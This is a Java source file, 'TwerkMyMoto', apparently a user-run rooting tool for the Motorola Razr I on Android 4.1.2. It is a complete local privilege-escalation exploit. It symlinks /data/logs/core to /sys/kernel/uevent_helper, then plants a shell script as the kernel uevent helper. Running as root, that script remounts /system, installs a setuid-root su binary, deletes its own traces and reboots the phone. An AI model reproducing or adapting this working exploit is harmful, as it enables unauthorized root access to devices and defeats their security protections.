import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;


public class TwerkMyMoto {

	public static void main(String[] args) {
	
		System.out.println("TwerkMyMoto 1.0 for Razr I (x86) 4.1.2");
		System.out.println("by Justin Case");
		System.out.println("PayPal or Google Wallet donations maybe sent to: jcase@cunninglogic.com");
		System.out.println("Special thanks to dagoban for persistance and testing");
		
		if (!new File("/data/local/tmp/su").exists()){
			System.out.println("Please read the directions, and push su to /data/local/tmp/su");
			System.exit(0);
		}
		
		if (exec("ls -l /sys/kernel/uevent_helper",false).contains("log")) {
			String command = 	"#!/system/bin/sh\n" +
					"/system/bin/mount -o remount,rw /system\n" +
					"/system/bin/cat /data/local/tmp/su > /system/xbin/su\n" +
					"/system/bin/chown 0.0 /system/xbin/su\n" +
					"/system/bin/chmod 06755 /system/xbin/su\n" +
					"/system/bin/rm /data/logs/core\n" +
					"/system/bin/rm /data/local/tmp/exploit.sh\n" +
					"/system/bin/sync\n" +
			//		"/system/bin/sleep 10\n" +
					"/system/bin/reboot\n";
			try {
				BufferedWriter out = new BufferedWriter(new FileWriter("/data/local/tmp/exploit.sh"));
				out.write(command);
				out.close();
			} catch (IOException e) 
			{   	    }							
			
			exec("chmod 755 /data/local/tmp/exploit.sh; echo '/data/local/tmp/exploit.sh' > /sys/kernel/uevent_helper", false);
			System.out.println("Please wait for your phone to reboot automatically, then install SuperSu app and enjoy root.");
		} else {
			exec("rm -r /data/logs/core; ln -s /sys/kernel/uevent_helper /data/logs/core", false);
			System.out.println("Please reboot your phone, and re-run rootme.sh");
		}
		
		
	}
	public static String exec(String cmd, boolean root){
		String shell = "sh";
		if (root) {
			shell = "su";
		}
		
		
	        
        final StringBuilder output = new StringBuilder();
        Process process;
        BufferedReader read = null;
        try {
      	  process = Runtime.getRuntime().exec(shell);
      	  DataOutputStream dos = new DataOutputStream(process.getOutputStream());
      	  dos.writeBytes(cmd + "\n");
      	  read = new BufferedReader(new InputStreamReader(process.getInputStream()));
      	  dos.writeBytes("exit\n");
      	  dos.flush();
      	  String line;
      	  String separator = System.getProperty("line.separator");
   
      	  while ((line = read.readLine()) != null) {
      		  output.append(line);
      		  output.append(separator);
      	  }

      	  try {
      		  process.waitFor();
      		  if (process.exitValue() != 255) {

      		  }
      		  else {

      		  }
      	  } catch (InterruptedException e) {
      		  e.printStackTrace();
      	  }
        } catch (IOException e) {
      	  e.printStackTrace();
        }
        return output.toString();
	}
}
